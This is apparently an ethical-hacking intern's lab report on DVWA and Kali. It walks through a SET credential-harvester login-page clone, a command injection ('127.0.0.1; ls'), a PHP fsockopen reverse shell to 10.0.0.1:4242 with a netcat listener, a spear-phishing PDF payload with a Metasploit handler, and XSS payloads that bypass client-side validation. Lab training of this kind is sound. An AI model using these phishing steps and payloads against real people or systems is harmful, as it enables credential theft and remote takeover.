<!-- Page 1 -->

Week 2: Web & Client-Side Attacks

● Goal: Exploit the human element and web vulnerabilities.

● Tasks:

○ Social Engineering: Use the Social Engineering Toolkit (SET) to create a fake  login page for a popular social media site

The Social Engineering Toolkit (SET) is an open-source penetration testing framework designed to  simulate social engineering attacks in a controlled environment.

It was created by David Kennedy, a cybersecurity expert and founder of TrustedSec.

What is Social Engineering?

Social engineering is the practice of manipulating people into revealing confidential information  rather than exploiting technical vulnerabilities.

Examples include:

•  Creating fake login pages (phishing)

•  Sending malicious email attachments

•  Trick users into entering credentials

•  Simulating real-world attack scenarios

What Can SET Do?

SET provides features such as:

•  Website cloning (for phishing simulations)

•  Credential harvesting

•  Payload generation (for security testing)

•  Email phishing campaigns (in lab environments)

•  Browser-based attack simulations

Where Is It Used?

SET is commonly used for:

•  Ethical hacking

•  Red team exercises
<!-- Page 2 -->

•  Security awareness training

•  Cybersecurity education labs (like DVWA testing)

Step 1: Launch SET

Open terminal and run:

sudo setoolkit

![Image from Page 2](Week 2_images/page_2_img_6.png)
<!-- Page 3 -->

Step 2: Select Social Engineering Attacks

From the main menu select:

1) Social Engineering Attacks

Step 3: Choose Website Attack Vectors  2) Website Attack Vectors

![Image from Page 3](Week 2_images/page_3_img_6.png)
<!-- Page 4 -->

Step 4: Select Credential Harvester Attack Method  3) Credential Harvester Attack Method

This method captures credentials entered into the cloned website.

![Image from Page 4](Week 2_images/page_4_img_4.jpeg)
<!-- Page 5 -->

Step 5: Select Site Cloner  2) Site Cloner

This option clones the target website.

Step 6: Enter IP Address

Enter the IP address of the attacker machine (Kali Linux).

![Image from Page 5](Week 2_images/page_5_img_8.png)

![Image from Page 5](Week 2_images/page_5_img_9.png)
<!-- Page 6 -->

You can check it using:

ip a

Example:

192.168.1.10

Step 7: Enter Target URL

Enter the URL of the website to clone (used only in lab testing).

Example:

http://example.com

SET will clone the login page and start a local web server.

![Image from Page 6](Week 2_images/page_6_img_13.png)
<!-- Page 7 -->

Step 8: Wait for Victim Interaction

When a user opens the cloned page and enters credentials, SET captures the submitted data.

Captured credentials are displayed in the terminal as:

## WE GOT A HIT!

Step 9: Generate Report

Press:

## CTRL + C

SET generates a report containing captured information.

![Image from Page 7](Week 2_images/page_7_img_20.png)
<!-- Page 8 -->

○ Web Hacking: Perform a Command Injection attack on DVWA to  view the /etc/passwd file of the server.

DVWA (Damn Vulnerable Web Application)

DVWA stands for Damn Vulnerable Web Application. It is an intentionally vulnerable web  application designed for learning and practicing web security testing in a safe lab environment.

Purpose of DVWA

DVWA is used to:

•  Learn web application vulnerabilities

•  Practice ethical hacking in a controlled environment

•  Understand how common attacks work

•  Test security tools like Burp Suite, OWASP ZAP, etc

![Image from Page 8](Week 2_images/page_8_img_14.png)
<!-- Page 9 -->

Open Command Injection Module

From the left menu, click Command Injection.

You will see an input field asking for an IP address

Enter:

127.0.0.1

You will see normal ping results.

127.0.0.1; ls

If the application is vulnerable, it will display the system username along with the ping  result.

![Image from Page 9](Week 2_images/page_9_img_11.png)
<!-- Page 10 -->

So I use the payload to see the files

'$sock=fsockopen("10.0.0.1",4242);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock,  2=>$sock),$pipes);'

Use your machine ip address in exchange on 10.0.0.1

First I created a port connection from Netcat on port no 4242 so that the connection becomes  statblished and a listening connection is created.

Command: nc -lvnp 4242

![Image from Page 10](Week 2_images/page_10_img_8.png)

![Image from Page 10](Week 2_images/page_10_img_9.jpeg)
<!-- Page 11 -->

Once the listening connection is established, you can get full access to it and then you can view any  file by using commands like I have done to view /etc/passwd

To see the list Run: cat passwd

Conclusion

In this practical, we successfully demonstrated a command injection vulnerability using DVWA in a  controlled lab environment. By entering malicious input into the application, we were able to  execute additional system-level commands along with the intended command.

This vulnerability occurs because the application does not properly validate or sanitize user input  before passing it to the system shell. As a result, attackers can manipulate input fields to execute  unauthorized commands on the server.

The experiment highlights the importance of proper input validation, secure coding practices, and  server-side filtering to prevent command injection attacks in real-world web applications.

![Image from Page 11](Week 2_images/page_11_img_11.png)
<!-- Page 12 -->

○ Payload Delivery: Create a malicious PDF or Office document that  triggers a reverse shell when opened

Steps to Create PDF from Text File in Linux

Step 1: Create a Text File

Nano Rahulmarksheet.txt

Add Information or any text which you want to add.

Save with:

CTRL + O → Enter

## CTRL + X

Step 2: Convert TXT to PDF

Step 3: Check the PDF

![Image from Page 12](Week 2_images/page_12_img_17.png)

![Image from Page 12](Week 2_images/page_12_img_18.png)

![Image from Page 12](Week 2_images/page_12_img_19.png)
<!-- Page 13 -->

Steps Performed Using SET Toolkit For Payload Delivery

Step 1: Open Terminal

Open terminal in Kali Linux.

Step 2: Start SET Toolkit

sudo setoolkit

Step 3: Select Social Engineering Attacks

From the menu:

1) Social-Engineering Attacks

Step 4: Select Attack Vector

Select Spear Phising Attack vector

![Image from Page 13](Week 2_images/page_13_img_16.jpeg)
<!-- Page 14 -->

Step 5:  Click On 1 Perform Mass Email Attack

Step 6: Then write 13 Adobe PDF Embbed Exe File

![Image from Page 14](Week 2_images/page_14_img_6.jpeg)

![Image from Page 14](Week 2_images/page_14_img_7.png)
<!-- Page 15 -->

STEP 7: Then Select 1 Select Your Own PDF.

STEP 8: Enter the Path of the PDF file

STEP 9:  Then provide the LHOST and Port no which you run the payload

![Image from Page 15](Week 2_images/page_15_img_10.png)

![Image from Page 15](Week 2_images/page_15_img_11.png)

![Image from Page 15](Week 2_images/page_15_img_12.jpeg)

![Image from Page 15](Week 2_images/page_15_img_13.png)
<!-- Page 16 -->

STEP 10: After that they will loading and we provide the sender email and receive email address.

STEP 11:  Now They setup the listening ports.

STEP 12:  Then the connection is got established.

![Image from Page 16](Week 2_images/page_16_img_7.png)

![Image from Page 16](Week 2_images/page_16_img_8.jpeg)
<!-- Page 17 -->

Step 13: Launch Metasploit Console

The Metasploit console was started to access its modules and configuration interface.

Step 14: Select a Generic Handler Module

A handler module was selected to manage incoming connections from a test payload.  This module is used to listen for and handle reverse connections during security testing.

![Image from Page 17](Week 2_images/page_17_img_10.png)

![Image from Page 17](Week 2_images/page_17_img_11.png)

![Image from Page 17](Week 2_images/page_17_img_12.png)
<!-- Page 18 -->

Step 15: Configure Payload Type

An appropriate payload type was selected for demonstration purposes in a lab environment.  The payload defines how communication would occur between the test system and the handler.

Step 16: Configure Network Parameters

Necessary network parameters such as:

•  Local host address

•  Listening port

were reviewed and configured according to the lab setup.

Step 17: Verify Configuration

The configured options were checked to ensure correct values before starting the listener.

Step 18: Start the Handler

The handler was executed to wait for incoming connections from the test payload within the  controlled environment.

Conclusion

In this practical, we explored the basic working of the Metasploit Framework using the msfconsole  interface in a controlled lab environment. We understood how a handler is configured, how payload  settings are reviewed, and how network parameters are verified before execution.

This experiment helped us understand how reverse connections are managed during penetration  testing and how attackers may attempt to gain remote access. It also highlighted the importance of  secure configurations, firewall rules, and updated systems to prevent unauthorized access.

![Image from Page 18](Week 2_images/page_18_img_20.jpeg)

![Image from Page 18](Week 2_images/page_18_img_21.jpeg)

![Image from Page 18](Week 2_images/page_18_img_22.jpeg)
<!-- Page 19 -->

Target Question: "How can you bypass a basic client-side JavaScript  validation to submit malicious code into a web form?"

To bypass basic client-side JavaScript validation on a web form (e.g., checks for XSS payloads, invalid  characters, or length limits) during a pentest, focus on techniques that evade the JS logic without  triggering it or by exploiting its weaknesses. Client-side validation is inherently insecure since it runs  in the user's browser and can be fully controlled. Here's how to do it step-by-step, assuming you're  testing a form with JS that blocks <script>alert(1)</script> or similar.

1. Disable JavaScript Entirely (Quickest Test)

•  Open browser DevTools (F12), go to Settings > Debugger > Disable JavaScript.

•  Or use a JS-disabled browser/profile (e.g., Firefox with javascript.enabled set to false  via about:config).

•  Submit the form directly—validation skips entirely. If it processes server-side without re- validation, you've bypassed it.

•  Why it works: All client-side checks are JS-based.

2. Tamper with the Form via Browser DevTools

•  Inspect the form element (right-click > Inspect).

•  Edit the input fields directly: Remove maxlength, pattern, or oninput handlers;  change type="text" to type="hidden"; or delete validation attributes  like required or minlength.

•  Modify the submit handler: Find the <form onsubmit="validate()"> or attached event  listener, edit/remove the JS function to always return true.

•  Example: If JS checks if (input.value.includes('<')) return false;, overwrite input.value with  your payload like <img src=x onerror=alert(1)>.

•  Submit. This tests if the raw payload reaches the server.

3. Use Burp Suite or Proxy Tampering (Most Reliable for Pentesters)

•  Intercept the request with Burp (Proxy tab > Intercept on).

•  Submit the form normally (JS validates client-side), but when Burp captures the POST/GET,  drop the JS payload in and resend.

Prepared By: Sachin

Company: CFSS (Cyber Security & Forensics Services)

Domain: Cyber Security & Ethical Hacking

Role: Ethical Hacking Intern
